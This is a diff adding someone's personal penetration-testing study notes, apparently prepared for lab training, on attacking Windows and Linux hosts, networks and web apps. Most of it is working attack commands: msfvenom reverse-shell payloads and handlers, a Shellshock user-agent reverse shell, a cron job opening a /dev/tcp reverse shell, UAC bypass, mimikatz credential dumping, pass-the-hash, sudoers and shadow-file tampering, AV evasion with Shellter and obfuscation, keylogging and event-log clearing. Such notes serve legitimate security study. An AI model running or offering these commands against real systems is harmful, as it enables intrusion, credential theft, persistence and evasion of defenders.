@@ -1,0 +1,912 @@
+Exploiting Windows Vulnerabilities	
+	Exploiting IIS:
+	
+		WebDAV Exploitation:
+			Detection:
+				 nmap
+					--script=http-enum
+				 hydra for bruteforcing the creds
+					hydra -L <userlist> -P <pw list>  ip/domain http-get(for form data) /webdav/(dir)
+			 Tools :
+				davtest: for checking 
+				cadaver: for uploading/manipulating files on server
+				
+				davtest -url http://domain/folder #for detecting webdav
+				davtest -auth uname:pw -url http://domain/folder #for auth
+				
+				cadaver http://url/dir
+				#commands will work as normal linux shell
+				put /path-to file/ for uploading shell
+				
+			Exploiting with metasploit:
+				msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=1234 -f asp >  shell.asp
+				upload the payload using cadaver.
+				listner:  use multi/handler/
+				set payload windows/meterpreter/reverse_tcp
+				show options-----click on the uploaded file displayed on browser
+			
+			same exploiation using msf shell.
+				   use iis_webdav_upload_asp
+				   path→ /webdav/filename.asp
+				
+	Exploiting SMB:
+		tool:psexec (for linux use script psexec.py or psexec metasploit)
+		first obtain the creds by bruteforcing,
+		psexec.py uname@ip cmd.exe
+		
+	Exploiting RDP:
+		msf: rdp_scanner : for confirming whether rdp is running or not, in case of default port tampering
+		bruteforce with hydra for creds
+		rdp://<ip> -s<port> 
+		for connecting:
+			xfreerdp /u:<uname> /p:<pw> /v:<ip>:<port>
+			(lab instance only have xfreerdp)
+		Exploiting Bluekeep rdp vulnerability.(only on 64 bit)
+			msf:BlueKeep
+			
+	Exploiting WinRM:
+	
+		crackmapexec for bruteforcing
+		evil-winrm for exploiting
+		
+		for bruteforcing:
+			crakcmapexec winrm <ip> -u <path>/or name -p/path/
+		for executing commands:
+		crackmapexec winrm <ip> -u <uname> -p <pw> =x “whoami”
+		
+		for getting a shell:
+		 evil-winrm.rb -u <uname> -p ‘<pw>’ -i <ip>
+		 					
+									or
+		msf: winrm_script_exec
+			set FORCE_VBS true
+			
+	WINDOWS PRIVILEGE ESCALATION:
+	
+	    windows kernel exploits:
+			Tools:
+				windows exploit suggester
+				windows kernel exploits (both on github).
+				
+			msf: local_exploit_suggester(use the recon one)
+				→ this will give us a lot of results verify them manually using google search,and also set the session for which we wan't to get the privilege
+				→ we have to upload the .exe into target system using msf in C:\\Temp folder
+				upload <path to .exe>
+				
+				./<.exe file>
+				
+				it'll give a lot of options of supportiing os,
+				./<.exe> <os-vers>
+				
+			Bypassing UAC using UACMe:
+			
+				pre condition: you should have an user account that is part of a local admin group
+				msf:rejetto
+				step1: generate a payload and send it to victim:
+				msfvenom -p windows/meterpreter/reverse_tcp LHOST=<>LPORT=<> -f .exe > virus.exe
+				for receiving connection:
+					use mutli/handler
+					set payload windows/meterpreter/reverse_tcp
+					set LHOST <>
+					set LPORT <>
+					upload virus.exe
+					upload Akagi64.exe
+					will be using method 23 from UAC me for this particular case
+					shell
+					Akagi64.exe 23 C:\users\admin\AppData\Local\Temp\backdoor.exe
+					#move the akagi and payload both to this folder
+					#akagi will bypass uac and the backdoor will be executed with admin privs
+					getprivs
+					
+			Access Token Impersonation:
+				    # msf:Incongnito
+				     msf rejetto
+					 pgrep explorer
+					 migrate <id>
+					 load incongnito
+					 list_tokens -u
+					 impersonate_token “TOKEN NAME(mostly admin one)"
+					 <if no tokens are listed we need to use potato attack>
+					
+		Windows Credential Dumping:
+			LSASS: is responsibe for auth, it's a process, it also have a cache , mimikatz will dump that cache
+			LM hash:weak
+			Unattended Windows setup utility: used for mass installation of windows
+			location:
+				C:\\Windows\Panther\Unattended.xml
+				C:\\Windows\Panther\Autounattended.xml #files maybe encoded in base64
+			get the file, get the meterpreter session, decode the password, login using psexec
+			
+			Dumping Hash using mimikatz: only for elevated privilleges
+				with msf:
+					load kiwi (ext in meterpreter)
+					type help and proceed (SAM)
+				with mimikatz:
+					upload /usr/share/windows-resources/mimikatz/x64/mimikathz.exe -> mimikatz.exe
+					then execute the uploaded file in victim system
+					lsadump::sam
+					sekurlsa::logonpasswords #it will display the system password if it's storing in clear text
+		
+		PASS THE HASH Attack:
+			get the hash using mimikatz:
+			smb/psexec :msf 
+
+Exploiting Linux Vulnerabilities:
+	Shellshock:
+		detection:
+			nmap --script=http-shellshock --script-args "http-shellshock.uri=/<cgi file name>
+		exploitaion:
+			after capturing the cgi req in burp.
+			user agent : () { :; }; echo; echo; /bin/bash/ ‘c ’cat /etc/passwd'
+			nc -nvlp 1234 : in our system
+			user agent : () { :; }; echo; echo; /bin/bash/ -c ’bash -i>&/dev/tcp/' :in burp
+			 same exploitation using msf:
+			 	msf:shellshock
+			
+Linux Privilege Escalation
+	Linux kernel exploits:
+		linux exploit suggester(github)
+		uploaad the file to victim through meterpreter session
+		change permission,
+		execute
+		from the above output choose apprrpriate script and upload 7 execute
+	
+	Exploiting Misconfigured cronjobs:
+		crontab -l
+		cd /
+		grep -rnw /usr -e “/home/student/message/”
+		ls -la /usr/local/share/copy.sh
+		#this lab env don't have any text editor so we'll use,
+		printf ‘#!/bin\necho “student ALL=NOPASSWD:ALL” >> /etc/sudoers’ > /usr/local/share/cppy.sh
+		sudo -l
+		cd /root
+	
+	Exploit SUID Binaries:
+	suid permitted files will have s in it's permission
+		file <filename>
+		strings <filename with s in permission>
+		rm <greetings>
+		cp /bin/bash greetings
+		
+	Linux Credential Dumping:
+
+
+	Network Bassed Attacks:
+    29/07/2023
+Network-Based Attacks - Part 1:
+	wireshark:
+	Tshark:
+		cli bassed wireshark
+		tshark -r <input pcap file> -z io,phs -q
+		
+	Filtering Basics:
+		tshark -r <> -Y ‘http’
+		tshark -r <> -Y ‘ip.src==<> && ip.dst==<>’
+		tshark -r <> -Y ‘http.request.method==GET’
+		tshark -r <> -Y ‘http.request.method==GET’ -Tfields -e frame.time -e ip.src -e http.request.full_uri | more
+		tshark -r <> -Y ‘http contains password’
+		
+	ARP Poisioning:
+		echo 1 > /proc/sys/net/ipv4/ip_forward
+		arpspoof -i <interface> -t <to ip> -r <from ip>
+	
+	Wifi Traffic Analysis:
+	
+	
+	Exploitation:
+    29/07/2023
+Vulnerability Scanning:
+	Banner Grabbing:
+		banner.nse
+		netcat
+	Searching exploits:
+		exploit db
+		rapid7
+		shodan
+		Searchsploit:
+		sudo apt-get update && sudo apt-get install exploitdb -y
+		searchsploit -m <exploit-db number>
+		searchsploit -c “keyword” #it'll search case sensitive
+		searchsploit -t
+		searchsploit -e
+		searchsploit remote windows ssh
+		searchsploit remote windows ssh -w #it'll give the online link for that exploit
+		sudo cp <full path to exploit> . #it'll compy it wo cwd
+	Fixing Exploits:
+		change the local ip addr
+		cp /usr/share/windows-resources/binaries/nc.exe .
+		start the http server in same directory
+		nc -nvlp <lport>
+		
+	Cross Compiling Exploits:
+		exploit-db bin exploits repo for precompiled binaries
+		for windows:
+			tools: windw-win64
+			i686-w64-mingw32-gcc <exploit>.c -o exploit #it'll give us the 64 bit payload
+			i686-w64-mingw32-gcc <exploit>.c -o exploit -lws2_32 #for 32 bit
+			
+	Shells:
+		Netcat:
+		certutil -urlcace -f http://<ip>/nc.exe #cmd prompt way of downloading file
+		nc.exe -nvlp 1234 > test.txt #it'll save anything sent over netcat to the file specified
+		nc.exe -nv 1234 > test.txt #sender side
+		
+	Reverse Shell Cheatsheet:
+		payload all things/reverse shell (github)
+		reverse shell generator
+		
+	Frameworks:
+		Powershell Empire:
+		Starkiller (gui for powershell)
+			sudo apt-get install powershell-Empire starkiller
+			sudo powershell-empire server
+			sudo powershell-empire client(in another tab)
+	
+	Windows:
+	
+		Windows Exploitation:
+			Port Scanning and Enumeration:
+				check the hosts file for target ip
+				scan using nmap save the output in xml format
+				
+			Targeting Microsoft IIS FTP:
+				perform bruteforcing using wordlist unix users
+				upload asp shell payload not meterpreter output it to .aspx
+			
+			Targeting OpenSSH:
+				bruteforce 
+				login
+				try upgrading to meterpreter session,
+				or else generate a payload and upload it through ssh sesssion
+				
+			Targeting SMB:
+				bruteforce
+				enumerate shares using smbclient,enum4linux,metasploit
+				locate psexec.py
+				try eternalblue
+			
+			Targeting MYSql Database server:
+				bruteforce:
+				or
+				compromise the system using eternal blue, c-wamp-wordpress-wp-config
+				the above location contains database password. change the phpmyadmin.conf file rules and upload the modified file so that it can be accessed by website
+				shell
+				net stop wampapache
+				net start wampapache
+				
+	LINUX:
+	
+		Targeting VSFTPD:
+			not always this exploit will work as it works on backdoor and can be patched by SA
+			Username enumeration using smtp_enum:			
+			bruteforce
+			upload a php reverse shell to /var/www/dav
+		
+		Targeting PHP:
+			check the php version using phpinfo.php file
+			searchsploit php cgi
+			modify the code,
+				edit the phpinfo(); in pwn code with a one liner php payload (can use reverse shell generator)
+				change the target ip
+				use python 2 for executing
+				if connection is breaking...change the valeu 3 to 4 in exploit code
+				
+		Targeting SAMBA:
+		use smb_version incase nmap doesn't gives
+		
+		OBFUSCATION:
+			AV Evasion with shelter:
+				sudo apt-get install shelter -y
+				dpkg --add-architecture i386
+				sudo apt-get install wine32
+				cd /usr/share/windows-resources/shellter
+				sudo wine shellter.exe
+				A
+				PE Target: /path to legitmate executable/
+				Y
+			Obfuscating powershell code:
+				tool:Invoke Obfuscation
+				sudo apt-get install powershell -y
+				pwsh
+				Import-Module ./Invoke-obsufaction.psd1
+				Invoke-obsufaction
+				
+		
+		Post Exploitation:
+        30/07/2023
+-------------
+1.Windows Local Enumeration:
+
+	Enumerating System Information:
+		shell
+		wmic qfe get Caption,Description,HotFixID,InstalledOn
+		cat the contains of eula.txt that'll give the os version
+	
+	Enumerating Users & Groups:
+		search logged_on
+		whoami /priv
+		query user
+		net users
+		net user <account name>
+		net localgroup <groupname>
+		
+	Enumerating Network Information:
+		ipconfig /all
+		route print
+		arp -a
+		netstat -ano
+		netsh firewall show state #type half command and press enter it'll show the options
+		netsh advfirewall firewall dump
+		netsh advfirewall show allprofiles
+	Enumerating Processes & Services:
+		shell:
+			net start
+			wmic service list brief
+			tasklist /SVC
+			schtasks /query /fo LIST /v #for scheduled tasks verbose
+			
+	Automating Windows Local Enumeration:
+		msf:
+			#for exploiting the system set force_vbs true
+			win_privs
+			enum_logged
+			checkvm
+			enum_applications
+			enum_computers
+			enum_patches
+			enum_shares
+
+		JAWS github:
+			ctrl+shift+alt # will give clipboad options
+			copy the content of jaws-enum.ps1 and save it to .ps1 ext in linux
+			shell
+			cd C:\\
+			mkdir Temp
+			cd Temp
+			upload /path-to-jaws-enum-file/
+			powershell.exe ExecutionPolicy Bypass -File .\filename.ps1 -OutputFilename <outputfilename>
+			
+Linux Local Enumeration:
+			Enumerating System Information:
+				Meterpreter:
+					sysinfo
+				shell:
+					cd /root
+					hostname
+					cat /etc/issue
+					cat /etc/*release
+					uname -a
+					uname -r
+					env
+					lscpu
+					free -h
+					df -h #filesystem
+					df -ht ext4 #specific file extension
+					lsblk | grep sd #list all the storage devices
+					dpkg -l #will list all the installed packages
+			Enumerating Users & Group:
+				meterpreter:
+					getuid
+				shell:
+					groups <uname>
+					cat /etc/passwd
+					grep -v /nologin
+					groups
+					groups <user>
+					w or who or last #lists the currently logged on users
+					lastlog #will give us login history
+			
+			Enumerating Network Information:
+				meterpreter:
+					ifconfig
+					netstat
+					route
+					arp
+				shell:
+					cat /etc/networks
+					cat /etc/hostname
+					cat /etc/resolve.conf #dns info
+					arp -a
+			Enumerating Processes & Cron Jobs:
+				shell:
+					ps aux or top #process info
+					crontab -l
+					la -la /etc/cron*
+			
+			Automation For Linux Enum:
+				tool:LinEnum (github):
+				use cgi_bash_env_exec (for shellshock exploitation)
+				msf:
+					enum_configs
+					enum_network
+					enum_system
+					checkvm
+				LinEnum:
+				copy the .sh file, upload it to victim, preferrabely temp
+				execute it there
+
+2. Transferring Files:
+			certutil in windows for downloading
+			wget in linux
+			
+3.Upgrading Shells:
+			cat /etc/shells
+				if python installed,
+						python -c 'import pty; pty.spawn("/bin/bash")'
+				if perl installed,
+						perl -e ‘exec “/bin/bash”’
+				if ruby installed,
+						ruby: exec “/bin/bash”
+				or if bash is there,
+				/bin/bash/ -i
+				
+				setting up env variable,
+				export PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/sbin:/bin
+				export TERM=xterm
+				export SHELL=bash
+				
+4.Escalation:
+	Windows Privilege Escalation:
+		for gaining access:
+			use web_delivery:(for exploiting lab)
+			set target PSH\ (Binary)
+			set payload windows/shell/reverse_tcp
+			set PSH-EncodedCommand false
+			copy the powershell code & open cmd in victims system & press enter
+			use shell_to_meterpreter
+			show advanced
+			set WIN_TRASFER VBS
+		for privexec:
+			PrivescCheck (github):
+				for lab:
+					c:\Usera\student\Desktop\PrivescCheck # this location already have that script downloaded
+					#for executing look at it's github page (use cmd one for lab)
+					#check for the winlogon creds
+					#use psexec for logging in(can use msf one also)
+					psexec.py Administrator@<ip>
+					
+	Linux Privillege Escalation:
+		LinEnum (github)
+		for lab:
+			Weak Permissions:
+				#exploit the machine on which you're given access
+				find / -not -type l -perm -o+w # this will list all the files in the system which can be modified by anyone in the system
+				#in this lab /etc/shadow file is having write access to everyone, we can replace the root user password by generating our own pw by using,
+				openssl passwd -1 -salt abc password123
+						
+			SUDO Privilleges:
+				sudo -l # it'll list the commands a user can run
+				if we add <!/bin/bash> on the bottom of man page it'll run with the same privillege
+	
+5.Persistence
+	Windows Persistence:
+		Persistence Via Services:
+			search persistence_service
+		Persistence Via RDP:
+			meterpreter:
+				run getgui -e -u newuser -p newusers'pass 
+				connect using any rdp client (xfreerdp)
+				
+	Linux Persistence:
+		Persistence via ssh keys
+			copy the private ssh key to our system
+			remove the wait file
+			ssh -i id_rsa uname@ip
+			
+		Persistence Via Cron Jobs:
+			cat /etc/cron
+			echo “* * * * * /bin/bash -c ‘bash -i >& /dev/tcp/<local ip>/port 0>&1’” > cron
+			crontab -i cron
+			crontab -l
+			set a nc listener on the same port
+			
+6.Dumping & Cracking:
+	WIndows:
+		Dumping & Cracking NTLM Hashes:
+			meterpreter:
+				pgrep lsass
+				migrate
+				hashdump
+			copy and paste the full hashes including the user and paste it in a local file in the computer (say hashes.txt)
+			John The Ripper:
+				john --list=formats | grep NT
+				john --format=NT hashes.txt #--wordlist = <path>#without wordlist it'll use it's own default wordlist(don't forgot to unzip it)
+				
+			hashcat: 
+				go through the help page for decoding the command
+				
+				hashcat -a3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
+	Linux:
+		Dumping & Cracking LInux Hashes:
+			meterpreter:
+				cat /etc/shadow
+				ctrl z
+				upgrade to meterpreter session
+				search hashdump(use the linux one)
+				copy full hash and save it to local desktop or copy the path to loot
+				gzip -d /path to rockyou/
+				john --format=sha512crypt <hash file path> --wordlist=<path to rockyou>
+				hashcat -a3 -m 1800 <hash path> <wordlist path>
+				
+7.Pivoting Lesson:
+	meterpreter:
+		run autoroute -s <2nd subnet>
+		run autoroute -p
+	Port Forwarding:
+		meterpreter:
+			portfwd add -l 1234 -p 80 -r <victim-2 ip> 
+			nmap -sV -p 1234 localhost
+				for this lab:
+					search badblue
+					set payload windows/meterpreter/bind_tcp
+					set rhost <victiim 2>
+8.Clearing:
+	Windows:
+		resource <cleanup resource link>
+		clearev
+	Linux:
+
+Metasploit:
+  Date: 22-07-2023
+-----------------------------------
+info command will give us details about any msf module
+MSF Workspaces:
+	workspace -h
+	workspace #it will show all the workspaces.
+	Information gathering & Enumeration:
+		Importing Nmap Results to MSF:
+		db_import /path to nmap result/
+		
+	Port Scanning with auxiliary module:
+		search portscan:for TCP
+		search udp_sweep : for UDP
+		for pivoting:
+		commands,
+			shell
+			/bin/bash -i
+			ip a
+			run autoroute -s <ip addr of first victim>
+			sessions -i <no> #for getting the meterpretor session
+		
+		Apache Enumeration:
+			• auxiliary/scanner/http/apache_userdir_enum
+			• auxiliary/scanner/http/brute_dirs
+			• auxiliary/scanner/http/dir_scanner
+			• auxiliary/scanner/http/dir_listing
+			• auxiliary/scanner/http/http_put
+			• auxiliary/scanner/http/files_dir
+			• auxiliary/scanner/http/http_login
+			• auxiliary/scanner/http/http_header
+			• auxiliary/scanner/http/http_version
+			• auxiliary/scanner/http/robots_txt
+			
+		SMTP Enumeration:
+			nmap --script banner
+			connecting with netcatt:
+			nc <ip> port
+				mail from: user@abc.xyz
+				rcpt to: receiver
+				data
+				subject: 
+				<msg body>
+				.
+			sendemail -f <from> -t <to> -s <ip> -u Fakemail -m “msg body" -o tls=no
+
+
+		
+
+msfconsole:
+		connect: (telnet alternative for msf)
+		
+	Vulnerability Scanning with Metasploit:
+		metasploit-autopwn github
+		analyze command
+		
+	NESSUS:
+		importing nessus results to msf:
+		db_import <path>
+		vulns -p 445 #it'll list all the vulns in the nessus results related to 445
+		
+	Web Application Vuln scanning using wmap.
+	msf:
+		load wmap
+		wmap_sites -a <ip>
+		wmap_targets -h
+		wmap_targets -t <urI>
+		wmap_sites -l
+		wmap_run -h
+		wmap_run -t
+		wmap_run -e
+		wmap_vulns -l
+		
+		Client-Side Attacks(Payloads)
+			msfvenom --list payloads
+			msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<own ip> LPORT=1234 -f exe > /otuput location>/payload_32_bit.exe
+			msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<own ip> LPORT=1234 -f exe > /otuput location>/payload_64_bit.exe
+			
+			msfvenom --list formats
+			
+			For creating handler:
+				use multi/handler
+				set payload windows/meterpreter/reverse_tcp
+				options
+				run
+			Encoding the payloads:
+				msfvnom -p windows/meterpreter/reverse_tcp LHOST=<> LPORT=<> -e x86/shikata_ga_nai -f exe > filename.exe
+				
+			Injecting Payloads into windows portable executables
+			
+			msfvnom -p windows/meterpreter/reverse_tcp LHOST=<> LPORT=<> -e x86/shikata_ga_nai -f exe -k -x /<path to the legitmate application>/ > filename.exe
+			
+			Automating Metasploit With Resource Scripts:
+			resource dir in metasploit (automated scripts)
+			 creating a script for creating multi-handler:
+			 
+			vi handler.rc
+				use multi/handler
+				set PAYLOAD windows/meterpreter/reverse_tcp
+				set LHOST <ip>
+				set LPORT 1234
+				run
+				
+			
+			for using it,
+				msfconsole -r handler.rc
+			if we have executed any task using metasploit and want to make a resource script,
+			just type makerc <filename>.rc after pressing ctrl c
+
+
+  Exploitation:
+    Windows Exploitation:
+  
+  	Exploiting SAMBA:
+  		msf: is_known_pipename 
+  			put the session in background(ctrl z)
+  		search shell_to_meterpreter
+  		
+  	Exploiting ssh:
+  		libssh:
+  		set spawn_pty true
+  		
+  	Exploiting SMTP:
+  			haraka 
+  			srvport 9898
+  			email_to root@attackdefence.test
+  			set payload linux/x64/meterpreter_reverse_http
+  	
+  	
+    Post Exploitation:
+        Meterpreter Fundamentals:
+	sessions -c sysinfo -i 1 #the command will be executed in the session 1
+	sessions -h
+	sessions -u 
+	notes
+	loot
+	
+	 Windows Post Exploitation::
+	
+		meterpreter:
+		    lpwd #prints the local pwd
+			help
+			search migrate
+			search win_privs
+			search enum_logged_on
+			search checkvm
+			search enum_applications
+			search enum_av
+			search enum_computers
+			search enum_patches
+			search enum_shares
+			search rdp
+			search -d /usr/bin -f *ckdo*
+			
+			loot #if we've created a database, then all the data's will be saved in a file, and this command will give us the location of those files.
+		
+		
+		Windows Privilege Escalation:
+		
+			windows exploit suggester in msf
+		
+		 		Bypassing UAC(In memory injection):
+					it will create a second meterpreter session with uac disabled
+					
+						after meterpreter:
+							shell
+							getprivs # will display the privilleges associated
+							net users # will list all the users
+							net localgroup Administrators
+							search bypass uac 
+					 		use exploit/windows/local/bypassuac_injection
+							set payload windows/x64/meterpreter_reverse_tcp
+							set Lport 8799
+							run
+							set TARGET (press tab, select windows x64)
+							run
+							getsystem
+							
+				Token Impersonation With Incognito:
+				delegation token: 
+				impersonation token: 
+				
+				meterpreter:
+					load incognito
+					list_tokens -u
+					(copy the delegation token name, the one with admin rights)
+					impersonate_toke “token name”
+					ps
+					migrate the meterpreter to any process with admin privs
+				
+				Dumping Hashes With Mimikatz:
+				
+				kiwi modules in Mimikatz:
+					msf:badblue
+					set target:set target "BadBlue\ EE\ 2.7\ Universal
+					pgrep lsass
+					migrate <pid>
+					load kiwi
+					help
+					creds_all
+					lsa_dump_sam
+					lsa_dump_secrets
+					
+				manual method of uploading mimikatz binary:
+					upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+					shell
+					.\mimikatz.exe
+					sekurlsa::logonpasswords
+					lsadump::sam
+				
+				Pass-the-Hash With PSExec:
+				use psesexec #choose the /smb/psexec/
+				set payload windows/x64/meterpreter/reverse_tcp
+				smbuser:<uname>
+				smbpass:<hash>
+				
+		Establishing Persistence on Windows:
+			search persistence
+			use persistence_service
+			set payload 64 bit meterpreter
+			
+		Enabling RDP:
+			search enable_rdp
+			net user administrator new_password #it'll change the account password
+			connect using xfreerdp
+			
+		Windows Keylogging:
+			migrate process to explorer or any same process
+			keyscan_start
+			keyscan_dump
+			
+		Clearing WIndows Event Logs:
+			in meterpreter:
+				clearev
+				
+		PIVOTING:
+		run autoroute -s <subnet>
+		portfwd add -l 1234 -p 80 -r <victim-2 ip>
+		db_nmap -sS -sV -p 1234 localhost
+		set payload windows/meterpreter/bind_tcp
+		
+		
+		
+		 Linux Post  Exploitation:
+			
+			Enumeration:
+				group <username> #it'll give the group name 
+				cat /etc/*issue
+				uname -r
+				uname -a
+				netstat -antp
+				ps aux
+				env
+				
+				msf modules:
+					search enum_configs
+					search env platform:linux
+					search enum_network
+					search enum_protections
+					search enum_systems
+					search checkcontainer
+					search checkvm
+					search enum_users_history
+					
+			Privilege Escalation:
+			
+				session -u <session no> #it'll upgrade the normal session to meterpreter session
+			    ps aux #check the process ran by root, and use that for privexec
+				set chkrootkit path
+					set CHKROOTKIT /bin/chkrootkit
+				
+			Dumping Hashes:
+				search hashdump
+			Establishing Persisitence on Linux:
+			
+				manual technique:
+					shell
+					/bin/bash -i
+					useradd -m ftp -s /bin/bash
+					passwd ftp
+					groups root
+					usermod -aG root ftp
+					groups ftp
+					usermod -u 15 ftp
+					
+				automatic:
+					search persistence platorm:linux
+						use ssh......
+						creatsfolder true
+						loot: for private key
+						vim ssh_key
+						chmod 0400 ssh_key
+						ssh -i ssh_key root@<target ip>
+					
+	
+				
+WebApp Pentesting:
+        02-08-2023
+-------------
+1.Directory Enumeration with Gobuster:
+	gobuster dir -u https://<ip> -w /path to wordlist/
+
+4.Scanning Web Application with nikto:
+	nikto -h http://...
+	nikto -h http://full-url -Tuning 5 -Dsiplay v
+
+5.SQLMap:
+	GET
+		sqlmap -u “urI” --cookie “paste the session id incl securty level(burp)” -p title
+		sqlmap -u “urI” --cookie “paste the session id incl securty level(burp)” -p title --dbs
+		sqlmap -u “urI” --cookie “paste the session id incl securty level(burp)” -D <database name> --tables
+		sqlmap -u “urI” --cookie “paste the session id incl securty level(burp)” -D <database name> -T <table name> --columns 
+		sqlmap -u “urI” --cookie “paste the session id incl securty level(burp)” -D <database name> -T <table name> --C <column name,col2,col3>
+
+	POST:
+		save the request to a file.
+		sqlmap -r <req file> -p title 
+		
+6.XSSER:
+	xsser --url “http://URI” -p “payload the same way in repeater(parameter)”
+	xsser --url “http://URI” -p “payload the same way in repeater” --auto
+	xsser --url “http://URI” -p “payload the same way in repeater” --Fp “<script>alert(1)</alert>”
+Authenticated xss with xsser:
+	xsser --url <URI,replace any param with XSS> --cookie="full cookie including security level"
+	xsser --url <URI,replace any param with XSS> --cookie="full cookie including security level" --Fp “<script>alert(1)</alert>”
+
+7.Attacking Login Form with Hydra:
+	hydra -L <ulist> -P <pwlist>  <ip> http-post-form “/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:<error msg>"
+
+8.Attacking Basic Auth using Burp:
+	uname:admin, pw bruteforce.
+	capture the req, base64decode the uname,pw: send to repeater->payload->payload Processing->add prefix->"admin:"-->add-->select rule type-->Encode-->Base64-encode-->start attack
+	
+	send the req with 3xx status code to decoder for acheiving password
+	
+9.Attacking Login Form with ZAP:
+	manual explore,use hud,launch browser
+	
+	
+  
+       
+		
+		
+    
+
+		
+	
+			
+				
+			
+			
+				
+					
+					
+				
+			
+				
+			
+		
+	
+			
+		
+		
+		
